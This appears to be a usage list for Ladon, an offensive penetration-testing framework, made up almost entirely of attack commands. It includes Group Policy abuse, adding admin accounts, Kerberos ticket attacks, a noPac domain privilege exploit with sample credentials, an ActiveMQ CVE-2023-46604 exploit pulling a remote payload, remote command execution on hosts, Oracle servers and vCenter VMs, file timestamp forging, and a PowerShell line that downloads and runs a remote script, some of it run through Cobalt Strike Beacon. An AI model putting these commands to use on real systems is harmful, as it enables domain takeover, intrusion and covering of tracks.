+Ladon SharpGPO --Action NewSecurityFiltering --GPOName testgpo --DomainComputer WIN-SERVER
+Ladon SharpGPO --Action NewSecurityFiltering --GPOName testgpo --NTAccount "Authenticated Users"
+Ladon SharpGPO --Action NewSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --DomainUser Alice
+Ladon SharpGPO --Action NewSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --DomainGroup "Domain Users"
+Ladon SharpGPO --Action NewSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --DomainComputer WIN-SERVER
+Ladon SharpGPO --Action NewSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --NTAccount "Authenticated Users"
+Ladon SharpGPO --Action RemoveSecurityFiltering --GPOName testgpo --DomainUser Alice
+Ladon SharpGPO --Action RemoveSecurityFiltering --GPOName testgpo --DomainGroup "Domain Users"
+Ladon SharpGPO --Action RemoveSecurityFiltering --GPOName testgpo --DomainComputer WIN-SERVER
+Ladon SharpGPO --Action RemoveSecurityFiltering --GPOName testgpo --NTAccount "Authenticated Users"
+Ladon SharpGPO --Action RemoveSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --DomainUser Alice
+Ladon SharpGPO --Action RemoveSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --DomainGroup "Domain Users"
+Ladon SharpGPO --Action RemoveSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --DomainComputer WIN-SERVER
+Ladon SharpGPO --Action RemoveSecurityFiltering --GUID F3402420-8E2A-42CA-86BE-4C5594FA5BD8 --NTAccount "Authenticated Users"
+Ladon IisInfo
+Ladon web 800 ldap=192.168.1.8:800
+Ladon web 800 rmi=192.168.1.8
+Ladon AddAdmin admin$ 123456
+Ladon AddUser admin$ 123456
+Ladon DelUser admin$
+比如TGT请求/ST请求/AS-REP Roasting/Kerberoasting/委派攻击/黄金票据/白银票据/钻石票据/蓝宝石票据等
+Ladon Rubeus
+CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter
+/domain /user /pass argument needed for scanning
+/dc /mAccount /nPassword argument needed for exploitation
+Examples:
+Ladon.exe noPac scan -domain htb.local -user domain_user -pass 'Password123!'
+Ladon.exe noPac -dc dc02.htb.local -mAccount demo -mPassword Password123!
+Ladon.exe noPac -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo /mPassword Password123!
+Ladon.exe noPac -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
+Ladon SharpGPOAbuse
+Ladon SharpSphere
+No verb selected.
+dump Snapshot and download memory dump file
+list List all VMs managed by this vCenter
+execute Execute given command in target VM
+c2 Run C2 using C3's VMwareShareFile module
+upload Upload file to target VM
+download Download file from target VM
+help Display more information on a specific command.
+version Display version information.
+Ladon MmcExec host cmdline
+Ladon MmcExec 127.0.0.1 calc
+Ladon MmcExec 127.0.0.1 Y2FsYw==
+Ladon ShellExec host cmdline
+Ladon ShellExec 127.0.0.1 calc
+Ladon ShellExec 127.0.0.1 Y2FsYw==
+Ladon ShellBrowserExec host cmdline
+Ladon ShellBrowserExec 127.0.0.1 calc
+Ladon ShellBrowserExec 127.0.0.1 Y2FsYw==
+Ladon 192.168.1.8/24 SmtpInfo
+Ladon 192.168.1.8/24 HttpInfo
+Ladon CVE-2023-46604 -i 192.168.1.8 -u http://192.168.1.1/poc.xml
+Ladon DomainLog -d 7
+Ladon DomainLog -h ip -d 7
+Ladon DomainLog -h ip -d 7 -grep user
+Ladon DomainLog -h ip -u username -p password -d 7
+Ladon DomainLog -h ip -u username -p password -d 7 -all
+Ladon DomainLog -h ip -u username -p password -d 7 -f user -o C:\path\res
+ult.txt
+Ladon LotusAdmin http://192.168.1.1
+Ladon LotusAdmin http://192.168.1.1/adm.nsf
+Ladon HtaSer
+Ladon HtaSer 8080
+Ladon 192.168.1.8/24 ConfVer
+Ladon http://192.168.1.8:8080 ConfVer
+Ladon url.txt ConfVer
+Ladon FindAD <parameters>
+Ladon pveFindADUser <parameters>
+Ladon OracleCmd2 192.168.1.8 1521 orcl admin 123456 whoami
+Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m1 whoami
+Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m2 whoami
+Ladon OracleCmd 192.168.1.8 1521 orcl admin 123456 m3 whoami
+Ladon BuildCS exe.cs exe
+Ladon BuildCS dll.cs dll
+Ladon BuildCS exe.cs dat
+Usage: Ladon UpdateFileTime <file_path>
+Ladon UpdateFileTime E:\Ladon911\Ladon.exe "2024-09-11 09:11:00"
+Ladon CopyFileTime E:\Ladon911\LadonExp.exe E:\Ladon911\Ladon.exe
+powershell
+Import-Module .\Ladon.ps1
+Ladon OnlinePC
+powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
+powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"
+powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon OnlinePC
+powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan '22,80,135,445'
+CS Beacon 探测存活主机
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon ICMP
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon NbtInfo
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon SmbInfo
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon LdapInfo
+CS Beacon 自定义端口扫描
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan '22,80,135,445'
+CS Beacon MS17010漏洞探测
+shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon 192.168.1.1/24 ms17010
+=======================================================
+http://k8gege.org/Ladon/example-en.html
+Latest version in small seal ring: http://k8gege.org/Ladon/update.txt
